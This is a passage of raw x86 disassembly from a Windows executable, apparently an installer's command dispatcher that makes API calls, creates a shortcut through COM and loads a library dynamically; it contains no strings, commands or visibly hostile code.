  401dce:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401dd1:	74 09                	je     0x401ddc
  401dd3:	6a 11                	push   $0x11
  401dd5:	e8 d1 0f 00 00       	call   0x402dab
  401dda:	eb 04                	jmp    0x401de0
  401ddc:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401de0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401de3:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401de6:	50                   	push   %eax
  401de7:	ff 75 08             	push   0x8(%ebp)
  401dea:	ff 15 64 82 40 00    	call   *0x408264
  401df0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401df3:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401df8:	50                   	push   %eax
  401df9:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401dfc:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e00:	50                   	push   %eax
  401e01:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e04:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e08:	50                   	push   %eax
  401e09:	ff 75 c8             	push   -0x38(%ebp)
  401e0c:	f7 de                	neg    %esi
  401e0e:	ff 75 bc             	push   -0x44(%ebp)
  401e11:	1b f6                	sbb    %esi,%esi
  401e13:	23 35 60 9a 42 00    	and    0x429a60,%esi
  401e19:	56                   	push   %esi
  401e1a:	ff 15 44 82 40 00    	call   *0x408244
  401e20:	8b f0                	mov    %eax,%esi
  401e22:	56                   	push   %esi
  401e23:	ff 75 c8             	push   -0x38(%ebp)
  401e26:	68 72 01 00 00       	push   $0x172
  401e2b:	ff 75 08             	push   0x8(%ebp)
  401e2e:	ff 15 58 82 40 00    	call   *0x408258
  401e34:	3b c3                	cmp    %ebx,%eax
  401e36:	74 0c                	je     0x401e44
  401e38:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e3b:	75 07                	jne    0x401e44
  401e3d:	50                   	push   %eax
  401e3e:	ff 15 54 80 40 00    	call   *0x408054
  401e44:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e47:	0f 8c e2 0d 00 00    	jl     0x402c2f
  401e4d:	56                   	push   %esi
  401e4e:	e9 1f f7 ff ff       	jmp    0x401572
  401e53:	ff 75 f8             	push   -0x8(%ebp)
  401e56:	ff 15 48 82 40 00    	call   *0x408248
  401e5c:	6a 02                	push   $0x2
  401e5e:	8b f0                	mov    %eax,%esi
  401e60:	e8 24 0f 00 00       	call   0x402d89
  401e65:	59                   	pop    %ecx
  401e66:	8b d8                	mov    %eax,%ebx
  401e68:	6a 48                	push   $0x48
  401e6a:	6a 5a                	push   $0x5a
  401e6c:	56                   	push   %esi
  401e6d:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e70:	ff 15 48 80 40 00    	call   *0x408048
  401e76:	50                   	push   %eax
  401e77:	53                   	push   %ebx
  401e78:	ff 15 48 81 40 00    	call   *0x408148
  401e7e:	56                   	push   %esi
  401e7f:	ff 75 f8             	push   -0x8(%ebp)
  401e82:	f7 d8                	neg    %eax
  401e84:	a3 f8 cd 40 00       	mov    %eax,0x40cdf8
  401e89:	ff 15 4c 82 40 00    	call   *0x40824c
  401e8f:	6a 03                	push   $0x3
  401e91:	e8 f3 0e 00 00       	call   0x402d89
  401e96:	a3 08 ce 40 00       	mov    %eax,0x40ce08
  401e9b:	8a 45 e0             	mov    -0x20(%ebp),%al
  401e9e:	59                   	pop    %ecx
  401e9f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ea2:	ff 75 d4             	push   -0x2c(%ebp)
  401ea5:	8a c8                	mov    %al,%cl
  401ea7:	80 e1 01             	and    $0x1,%cl
  401eaa:	c6 05 0f ce 40 00 01 	movb   $0x1,0x40ce0f
  401eb1:	88 0d 0c ce 40 00    	mov    %cl,0x40ce0c
  401eb7:	8a c8                	mov    %al,%cl
  401eb9:	80 e1 02             	and    $0x2,%cl
  401ebc:	24 04                	and    $0x4,%al
  401ebe:	68 14 ce 40 00       	push   $0x40ce14
  401ec3:	88 0d 0d ce 40 00    	mov    %cl,0x40ce0d
  401ec9:	a2 0e ce 40 00       	mov    %al,0x40ce0e
  401ece:	e8 ec 47 00 00       	call   0x4066bf
  401ed3:	68 f8 cd 40 00       	push   $0x40cdf8
  401ed8:	ff 15 5c 80 40 00    	call   *0x40805c
  401ede:	e9 5a 07 00 00       	jmp    0x40263d
  401ee3:	53                   	push   %ebx
  401ee4:	e8 a0 0e 00 00       	call   0x402d89
  401ee9:	6a 01                	push   $0x1
  401eeb:	8b f0                	mov    %eax,%esi
  401eed:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ef0:	e8 94 0e 00 00       	call   0x402d89
  401ef5:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401ef8:	59                   	pop    %ecx
  401ef9:	59                   	pop    %ecx
  401efa:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401efd:	50                   	push   %eax
  401efe:	56                   	push   %esi
  401eff:	75 0b                	jne    0x401f0c
  401f01:	ff 15 28 82 40 00    	call   *0x408228
  401f07:	e9 23 0d 00 00       	jmp    0x402c2f
  401f0c:	ff 15 50 82 40 00    	call   *0x408250
  401f12:	e9 18 0d 00 00       	jmp    0x402c2f
  401f17:	53                   	push   %ebx
  401f18:	e8 8e 0e 00 00       	call   0x402dab
  401f1d:	6a 31                	push   $0x31
  401f1f:	8b f0                	mov    %eax,%esi
  401f21:	e8 85 0e 00 00       	call   0x402dab
  401f26:	6a 22                	push   $0x22
  401f28:	8b d8                	mov    %eax,%ebx
  401f2a:	e8 7c 0e 00 00       	call   0x402dab
  401f2f:	6a 15                	push   $0x15
  401f31:	8b f8                	mov    %eax,%edi
  401f33:	e8 73 0e 00 00       	call   0x402dab
  401f38:	6a ec                	push   $0xffffffec
  401f3a:	e8 e4 f4 ff ff       	call   0x401423
  401f3f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f42:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f48:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f4b:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f51:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f54:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f57:	66 8b 06             	mov    (%esi),%ax
  401f5a:	66 f7 d8             	neg    %ax
  401f5d:	1b c0                	sbb    %eax,%eax
  401f5f:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f62:	23 c6                	and    %esi,%eax
  401f64:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f67:	66 8b 07             	mov    (%edi),%ax
  401f6a:	66 f7 d8             	neg    %ax
  401f6d:	1b c0                	sbb    %eax,%eax
  401f6f:	c7 45 8c 00 50 43 00 	movl   $0x435000,-0x74(%ebp)
  401f76:	23 c7                	and    %edi,%eax
  401f78:	89 45 88             	mov    %eax,-0x78(%ebp)
  401f7b:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401f81:	50                   	push   %eax
  401f82:	e8 21 3d 00 00       	call   0x405ca8
  401f87:	85 c0                	test   %eax,%eax
  401f89:	0f 84 a4 09 00 00    	je     0x402933
  401f8f:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401f96:	0f 84 93 0c 00 00    	je     0x402c2f
  401f9c:	ff 75 ac             	push   -0x54(%ebp)
  401f9f:	e8 7d 4b 00 00       	call   0x406b21
  401fa4:	ff 75 ac             	push   -0x54(%ebp)
  401fa7:	eb 47                	jmp    0x401ff0
  401fa9:	53                   	push   %ebx
  401faa:	e8 fc 0d 00 00       	call   0x402dab
  401faf:	8b f0                	mov    %eax,%esi
  401fb1:	56                   	push   %esi
  401fb2:	6a eb                	push   $0xffffffeb
  401fb4:	e8 4e 37 00 00       	call   0x405707
  401fb9:	56                   	push   %esi
  401fba:	e8 a6 3c 00 00       	call   0x405c65
  401fbf:	8b f0                	mov    %eax,%esi
  401fc1:	3b f3                	cmp    %ebx,%esi
  401fc3:	0f 84 6a 09 00 00    	je     0x402933
  401fc9:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401fcc:	74 21                	je     0x401fef
  401fce:	56                   	push   %esi
  401fcf:	e8 4d 4b 00 00       	call   0x406b21
  401fd4:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401fd7:	7c 0b                	jl     0x401fe4
  401fd9:	50                   	push   %eax
  401fda:	ff 75 f4             	push   -0xc(%ebp)
  401fdd:	e8 e7 45 00 00       	call   0x4065c9
  401fe2:	eb 0b                	jmp    0x401fef
  401fe4:	3b c3                	cmp    %ebx,%eax
  401fe6:	74 07                	je     0x401fef
  401fe8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fef:	56                   	push   %esi
  401ff0:	ff 15 fc 80 40 00    	call   *0x4080fc
  401ff6:	e9 34 0c 00 00       	jmp    0x402c2f
  401ffb:	6a 02                	push   $0x2
  401ffd:	e8 a9 0d 00 00       	call   0x402dab
  402002:	50                   	push   %eax
  402003:	e8 d7 49 00 00       	call   0x4069df
  402008:	8b f0                	mov    %eax,%esi
  40200a:	3b f3                	cmp    %ebx,%esi
  40200c:	74 13                	je     0x402021
  40200e:	ff 76 14             	push   0x14(%esi)
  402011:	ff 75 f4             	push   -0xc(%ebp)
  402014:	e8 b0 45 00 00       	call   0x4065c9
  402019:	ff 76 18             	push   0x18(%esi)
  40201c:	e9 51 f5 ff ff       	jmp    0x401572
  402021:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402024:	66 89 1f             	mov    %bx,(%edi)
  402027:	66 89 18             	mov    %bx,(%eax)
  40202a:	e9 04 09 00 00       	jmp    0x402933
  40202f:	6a ee                	push   $0xffffffee
  402031:	e8 75 0d 00 00       	call   0x402dab
  402036:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402039:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40203c:	51                   	push   %ecx
  40203d:	50                   	push   %eax
  40203e:	6a 0b                	push   $0xb
  402040:	e8 31 4a 00 00       	call   0x406a76
  402045:	ff d0                	call   *%eax
  402047:	8b f0                	mov    %eax,%esi
  402049:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204c:	66 89 1f             	mov    %bx,(%edi)
  40204f:	3b f3                	cmp    %ebx,%esi
  402051:	66 89 18             	mov    %bx,(%eax)
  402054:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40205b:	0f 84 ce 0b 00 00    	je     0x402c2f
  402061:	56                   	push   %esi
  402062:	6a 40                	push   $0x40
  402064:	ff 15 10 81 40 00    	call   *0x408110
  40206a:	3b c3                	cmp    %ebx,%eax
  40206c:	89 45 08             	mov    %eax,0x8(%ebp)
  40206f:	0f 84 ba 0b 00 00    	je     0x402c2f
  402075:	6a 0c                	push   $0xc
  402077:	e8 fa 49 00 00       	call   0x406a76
  40207c:	6a 0d                	push   $0xd
  40207e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402081:	e8 f0 49 00 00       	call   0x406a76
  402086:	ff 75 08             	push   0x8(%ebp)
  402089:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40208c:	56                   	push   %esi
  40208d:	53                   	push   %ebx
  40208e:	ff 75 c8             	push   -0x38(%ebp)
  402091:	ff 55 c0             	call   *-0x40(%ebp)
  402094:	85 c0                	test   %eax,%eax
  402096:	74 3c                	je     0x4020d4
  402098:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40209b:	50                   	push   %eax
  40209c:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40209f:	50                   	push   %eax
  4020a0:	68 14 a0 40 00       	push   $0x40a014
  4020a5:	ff 75 08             	push   0x8(%ebp)
  4020a8:	ff 55 e8             	call   *-0x18(%ebp)
  4020ab:	85 c0                	test   %eax,%eax
  4020ad:	74 25                	je     0x4020d4
  4020af:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020b2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020b5:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020b9:	57                   	push   %edi
  4020ba:	e8 0a 45 00 00       	call   0x4065c9
  4020bf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020c2:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020c5:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020c9:	ff 75 f4             	push   -0xc(%ebp)
  4020cc:	e8 f8 44 00 00       	call   0x4065c9
  4020d1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020d4:	ff 75 08             	push   0x8(%ebp)
  4020d7:	e9 34 fb ff ff       	jmp    0x401c10
  4020dc:	39 1d 20 9b 42 00    	cmp    %ebx,0x429b20
  4020e2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020e9:	0f 8c b9 00 00 00    	jl     0x4021a8
  4020ef:	6a f0                	push   $0xfffffff0
  4020f1:	e8 b5 0c 00 00       	call   0x402dab
  4020f6:	6a 01                	push   $0x1
  4020f8:	8b f8                	mov    %eax,%edi
  4020fa:	e8 ac 0c 00 00       	call   0x402dab
  4020ff:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402102:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402105:	74 0e                	je     0x402115
  402107:	57                   	push   %edi
  402108:	ff 15 14 81 40 00    	call   *0x408114
  40210e:	3b c3                	cmp    %ebx,%eax
  402110:	89 45 08             	mov    %eax,0x8(%ebp)
  402113:	75 11                	jne    0x402126
  402115:	6a 08                	push   $0x8
  402117:	53                   	push   %ebx
  402118:	57                   	push   %edi
  402119:	ff 15 18 81 40 00    	call   *0x408118
  40211f:	3b c3                	cmp    %ebx,%eax
  402121:	89 45 08             	mov    %eax,0x8(%ebp)
  402124:	74 7b                	je     0x4021a1
  402126:	ff 75 bc             	push   -0x44(%ebp)
  402129:	ff 75 08             	push   0x8(%ebp)
  40212c:	e8 b4 49 00 00       	call   0x406ae5
  402131:	8b f8                	mov    %eax,%edi
  402133:	3b fb                	cmp    %ebx,%edi
  402135:	74 39                	je     0x402170
  402137:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40213a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40213d:	74 17                	je     0x402156
  40213f:	ff 75 d8             	push   -0x28(%ebp)
  402142:	e8 dc f2 ff ff       	call   0x401423
  402147:	ff d7                	call   *%edi
  402149:	85 c0                	test   %eax,%eax
  40214b:	74 2d                	je     0x40217a
  40214d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402154:	eb 24                	jmp    0x40217a
  402156:	68 00 a0 40 00       	push   $0x40a000
  40215b:	68 58 ce 40 00       	push   $0x40ce58
  402160:	56                   	push   %esi
  402161:	68 00 04 00 00       	push   $0x400
  402166:	ff 75 f8             	push   -0x8(%ebp)
  402169:	ff d7                	call   *%edi
  40216b:	83 c4 14             	add    $0x14,%esp
  40216e:	eb 0a                	jmp    0x40217a
  402170:	ff 75 bc             	push   -0x44(%ebp)
  402173:	6a f7                	push   $0xfffffff7
  402175:	e8 8d 35 00 00       	call   0x405707
  40217a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40217d:	0f 85 ac 0a 00 00    	jne    0x402c2f
  402183:	ff 75 08             	push   0x8(%ebp)
  402186:	e8 69 1b 00 00       	call   0x403cf4
  40218b:	85 c0                	test   %eax,%eax
  40218d:	0f 84 9c 0a 00 00    	je     0x402c2f
  402193:	ff 75 08             	push   0x8(%ebp)
  402196:	ff 15 1c 81 40 00    	call   *0x40811c
  40219c:	e9 8e 0a 00 00       	jmp    0x402c2f
  4021a1:	6a f6                	push   $0xfffffff6
  4021a3:	e9 4e 01 00 00       	jmp    0x4022f6
  4021a8:	6a e7                	push   $0xffffffe7
  4021aa:	e9 47 01 00 00       	jmp    0x4022f6
  4021af:	6a f0                	push   $0xfffffff0
  4021b1:	e8 f5 0b 00 00       	call   0x402dab
  4021b6:	6a df                	push   $0xffffffdf
  4021b8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021bb:	e8 eb 0b 00 00       	call   0x402dab
  4021c0:	6a 02                	push   $0x2
  4021c2:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021c5:	e8 e1 0b 00 00       	call   0x402dab
  4021ca:	6a cd                	push   $0xffffffcd
  4021cc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021cf:	e8 d7 0b 00 00       	call   0x402dab
  4021d4:	6a 45                	push   $0x45
  4021d6:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4021d9:	e8 cd 0b 00 00       	call   0x402dab
  4021de:	ff 75 bc             	push   -0x44(%ebp)
  4021e1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021e4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4021e7:	8b c8                	mov    %eax,%ecx
  4021e9:	8b f8                	mov    %eax,%edi
  4021eb:	8b f0                	mov    %eax,%esi
  4021ed:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4021f3:	c1 f8 10             	sar    $0x10,%eax
  4021f6:	c1 fe 0c             	sar    $0xc,%esi
  4021f9:	25 ff ff 00 00       	and    $0xffff,%eax
  4021fe:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402201:	81 e7 00 80 00 00    	and    $0x8000,%edi
  402207:	83 e6 07             	and    $0x7,%esi
  40220a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40220d:	e8 b6 3d 00 00       	call   0x405fc8
  402212:	85 c0                	test   %eax,%eax
  402214:	75 07                	jne    0x40221d
  402216:	6a 21                	push   $0x21
  402218:	e8 8e 0b 00 00       	call   0x402dab
  40221d:	8d 45 08             	lea    0x8(%ebp),%eax
  402220:	50                   	push   %eax
  402221:	68 cc 84 40 00       	push   $0x4084cc
  402226:	6a 01                	push   $0x1
  402228:	53                   	push   %ebx
  402229:	68 dc 84 40 00       	push   $0x4084dc
  40222e:	ff 15 90 82 40 00    	call   *0x408290
  402234:	3b c3                	cmp    %ebx,%eax
  402236:	0f 8c b1 00 00 00    	jl     0x4022ed
  40223c:	8b 45 08             	mov    0x8(%ebp),%eax
  40223f:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402242:	52                   	push   %edx
  402243:	68 ec 84 40 00       	push   $0x4084ec
  402248:	8b 08                	mov    (%eax),%ecx
  40224a:	50                   	push   %eax
  40224b:	ff 11                	call   *(%ecx)
  40224d:	3b c3                	cmp    %ebx,%eax
  40224f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402252:	0f 8c 87 00 00 00    	jl     0x4022df
  402258:	8b 45 08             	mov    0x8(%ebp),%eax
  40225b:	ff 75 bc             	push   -0x44(%ebp)
  40225e:	8b 08                	mov    (%eax),%ecx
  402260:	50                   	push   %eax
  402261:	ff 51 50             	call   *0x50(%ecx)
  402264:	3b fb                	cmp    %ebx,%edi
  402266:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402269:	75 0e                	jne    0x402279
  40226b:	8b 45 08             	mov    0x8(%ebp),%eax
  40226e:	68 00 50 43 00       	push   $0x435000
  402273:	50                   	push   %eax
  402274:	8b 08                	mov    (%eax),%ecx
  402276:	ff 51 24             	call   *0x24(%ecx)
  402279:	3b f3                	cmp    %ebx,%esi
  40227b:	74 0a                	je     0x402287
  40227d:	8b 45 08             	mov    0x8(%ebp),%eax
  402280:	56                   	push   %esi
  402281:	50                   	push   %eax
  402282:	8b 08                	mov    (%eax),%ecx
  402284:	ff 51 3c             	call   *0x3c(%ecx)
  402287:	8b 45 08             	mov    0x8(%ebp),%eax
  40228a:	ff 75 c0             	push   -0x40(%ebp)
  40228d:	8b 08                	mov    (%eax),%ecx
  40228f:	50                   	push   %eax
  402290:	ff 51 34             	call   *0x34(%ecx)
  402293:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402296:	66 39 19             	cmp    %bx,(%ecx)
  402299:	74 0d                	je     0x4022a8
  40229b:	8b 45 08             	mov    0x8(%ebp),%eax
  40229e:	ff 75 b0             	push   -0x50(%ebp)
  4022a1:	8b 10                	mov    (%eax),%edx
  4022a3:	51                   	push   %ecx
  4022a4:	50                   	push   %eax
  4022a5:	ff 52 44             	call   *0x44(%edx)
  4022a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4022ab:	ff 75 f8             	push   -0x8(%ebp)
  4022ae:	8b 08                	mov    (%eax),%ecx
  4022b0:	50                   	push   %eax
  4022b1:	ff 51 2c             	call   *0x2c(%ecx)
  4022b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b7:	ff 75 f4             	push   -0xc(%ebp)
  4022ba:	8b 08                	mov    (%eax),%ecx
  4022bc:	50                   	push   %eax
  4022bd:	ff 51 1c             	call   *0x1c(%ecx)
  4022c0:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022c3:	7c 11                	jl     0x4022d6
  4022c5:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022c8:	6a 01                	push   $0x1
  4022ca:	ff 75 f0             	push   -0x10(%ebp)
  4022cd:	8b 08                	mov    (%eax),%ecx
  4022cf:	50                   	push   %eax
  4022d0:	ff 51 18             	call   *0x18(%ecx)
  4022d3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022d6:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022d9:	50                   	push   %eax
  4022da:	8b 08                	mov    (%eax),%ecx
  4022dc:	ff 51 08             	call   *0x8(%ecx)
  4022df:	8b 45 08             	mov    0x8(%ebp),%eax
  4022e2:	50                   	push   %eax
  4022e3:	8b 08                	mov    (%eax),%ecx
  4022e5:	ff 51 08             	call   *0x8(%ecx)
  4022e8:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022eb:	7d 13                	jge    0x402300
  4022ed:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4022f4:	6a f0                	push   $0xfffffff0
  4022f6:	e8 28 f1 ff ff       	call   0x401423
  4022fb:	e9 2f 09 00 00       	jmp    0x402c2f
  402300:	6a f4                	push   $0xfffffff4
  402302:	eb f2                	jmp    0x4022f6
  402304:	53                   	push   %ebx
  402305:	e8 a1 0a 00 00       	call   0x402dab
  40230a:	6a 11                	push   $0x11
  40230c:	8b f0                	mov    %eax,%esi
  40230e:	e8 98 0a 00 00       	call   0x402dab
  402313:	6a 23                	push   $0x23
  402315:	8b f8                	mov    %eax,%edi
  402317:	e8 8f 0a 00 00       	call   0x402dab
  40231c:	56                   	push   %esi
  40231d:	89 45 08             	mov    %eax,0x8(%ebp)
  402320:	e8 ba 46 00 00       	call   0x4069df
  402325:	85 c0                	test   %eax,%eax
  402327:	75 0d                	jne    0x402336
  402329:	53                   	push   %ebx
  40232a:	6a f9                	push   $0xfffffff9
  40232c:	e8 d6 33 00 00       	call   0x405707
  402331:	e9 fd 05 00 00       	jmp    0x402933
  402336:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402339:	56                   	push   %esi
  40233a:	89 45 90             	mov    %eax,-0x70(%ebp)
  40233d:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  402344:	e8 4f 43 00 00       	call   0x406698
  402349:	57                   	push   %edi
  40234a:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  40234f:	e8 44 43 00 00       	call   0x406698
  402354:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402359:	8b 45 08             	mov    0x8(%ebp),%eax
  40235c:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402360:	50                   	push   %eax
  402361:	53                   	push   %ebx
  402362:	89 75 98             	mov    %esi,-0x68(%ebp)
  402365:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  402368:	89 45 aa             	mov    %eax,-0x56(%ebp)
  40236b:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  40236f:	e8 93 33 00 00       	call   0x405707
  402374:	8d 45 90             	lea    -0x70(%ebp),%eax
  402377:	50                   	push   %eax
  402378:	ff 15 80 81 40 00    	call   *0x408180
  40237e:	85 c0                	test   %eax,%eax
  402380:	0f 84 a9 08 00 00    	je     0x402c2f
  402386:	eb a1                	jmp    0x402329
  402388:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  40238d:	74 1d                	je     0x4023ac
  40238f:	68 10 00 20 00       	push   $0x200010
  402394:	6a e8                	push   $0xffffffe8
  402396:	53                   	push   %ebx
  402397:	e8 23 43 00 00       	call   0x4066bf
  40239c:	50                   	push   %eax
  40239d:	e8 40 39 00 00       	call   0x405ce2
  4023a2:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023a7:	e9 8e 08 00 00       	jmp    0x402c3a
  4023ac:	ff 05 f4 9a 42 00    	incl   0x429af4
  4023b2:	e9 78 08 00 00       	jmp    0x402c2f
  4023b7:	33 f6                	xor    %esi,%esi
  4023b9:	33 ff                	xor    %edi,%edi
  4023bb:	3b c3                	cmp    %ebx,%eax
  4023bd:	74 08                	je     0x4023c7
  4023bf:	53                   	push   %ebx
  4023c0:	e8 e6 09 00 00       	call   0x402dab
  4023c5:	8b f0                	mov    %eax,%esi
  4023c7:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023ca:	74 09                	je     0x4023d5
  4023cc:	6a 11                	push   $0x11
  4023ce:	e8 d8 09 00 00       	call   0x402dab
  4023d3:	8b f8                	mov    %eax,%edi
  4023d5:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023d8:	74 09                	je     0x4023e3
  4023da:	6a 22                	push   $0x22
  4023dc:	e8 ca 09 00 00       	call   0x402dab
  4023e1:	8b d8                	mov    %eax,%ebx
  4023e3:	6a cd                	push   $0xffffffcd
  4023e5:	e8 c1 09 00 00       	call   0x402dab
  4023ea:	50                   	push   %eax
  4023eb:	53                   	push   %ebx
  4023ec:	57                   	push   %edi
  4023ed:	56                   	push   %esi
  4023ee:	ff 15 20 81 40 00    	call   *0x408120
  4023f4:	e9 c0 f1 ff ff       	jmp    0x4015b9
  4023f9:	a1 10 a0 40 00       	mov    0x40a010,%eax
  4023fe:	6a 01                	push   $0x1
  402400:	89 45 08             	mov    %eax,0x8(%ebp)
  402403:	e8 a3 09 00 00       	call   0x402dab
  402408:	6a 12                	push   $0x12
  40240a:	8b f0                	mov    %eax,%esi
  40240c:	e8 9a 09 00 00       	call   0x402dab
  402411:	6a dd                	push   $0xffffffdd
  402413:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402416:	e8 90 09 00 00       	call   0x402dab
  40241b:	50                   	push   %eax
  40241c:	68 ff 03 00 00       	push   $0x3ff
  402421:	8d 45 08             	lea    0x8(%ebp),%eax
  402424:	57                   	push   %edi
  402425:	50                   	push   %eax
  402426:	ff 75 f0             	push   -0x10(%ebp)
  402429:	56                   	push   %esi
  40242a:	ff 15 24 81 40 00    	call   *0x408124
  402430:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  402434:	e9 1d f3 ff ff       	jmp    0x401756
  402439:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40243c:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40243f:	75 2b                	jne    0x40246c
  402441:	6a 02                	push   $0x2
  402443:	e8 a3 09 00 00       	call   0x402deb
  402448:	8b f0                	mov    %eax,%esi
  40244a:	3b f3                	cmp    %ebx,%esi
  40244c:	0f 84 e1 04 00 00    	je     0x402933
  402452:	6a 33                	push   $0x33
  402454:	e8 52 09 00 00       	call   0x402dab
  402459:	50                   	push   %eax
  40245a:	56                   	push   %esi
  40245b:	ff 15 14 80 40 00    	call   *0x408014
  402461:	56                   	push   %esi
  402462:	8b f8                	mov    %eax,%edi
  402464:	ff 15 10 80 40 00    	call   *0x408010
  40246a:	eb 16                	jmp    0x402482
  40246c:	6a 22                	push   $0x22
  40246e:	e8 38 09 00 00       	call   0x402dab
  402473:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402476:	d1 f9                	sar    $1,%ecx
  402478:	51                   	push   %ecx
  402479:	50                   	push   %eax
  40247a:	56                   	push   %esi
  40247b:	e8 e9 09 00 00       	call   0x402e69
  402480:	8b f8                	mov    %eax,%edi
  402482:	3b fb                	cmp    %ebx,%edi
  402484:	0f 84 a5 07 00 00    	je     0x402c2f
  40248a:	e9 a4 04 00 00       	jmp    0x402933
  40248f:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402492:	8b f8                	mov    %eax,%edi
  402494:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402497:	6a 02                	push   $0x2
  402499:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40249c:	e8 0a 09 00 00       	call   0x402dab
  4024a1:	6a 11                	push   $0x11
  4024a3:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024a6:	e8 00 09 00 00       	call   0x402dab
  4024ab:	6a 02                	push   $0x2
  4024ad:	50                   	push   %eax
  4024ae:	57                   	push   %edi
  4024af:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024b6:	e8 80 09 00 00       	call   0x402e3b
  4024bb:	3b c3                	cmp    %ebx,%eax
  4024bd:	89 45 08             	mov    %eax,0x8(%ebp)
  4024c0:	0f 84 69 07 00 00    	je     0x402c2f
  4024c6:	33 c0                	xor    %eax,%eax
  4024c8:	83 fe 01             	cmp    $0x1,%esi
  4024cb:	bf f8 b5 40 00       	mov    $0x40b5f8,%edi
  4024d0:	75 11                	jne    0x4024e3
  4024d2:	6a 23                	push   $0x23
  4024d4:	e8 d2 08 00 00       	call   0x402dab
  4024d9:	57                   	push   %edi
  4024da:	e8 b9 41 00 00       	call   0x406698
  4024df:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4024e3:	83 fe 04             	cmp    $0x4,%esi
  4024e6:	75 12                	jne    0x4024fa
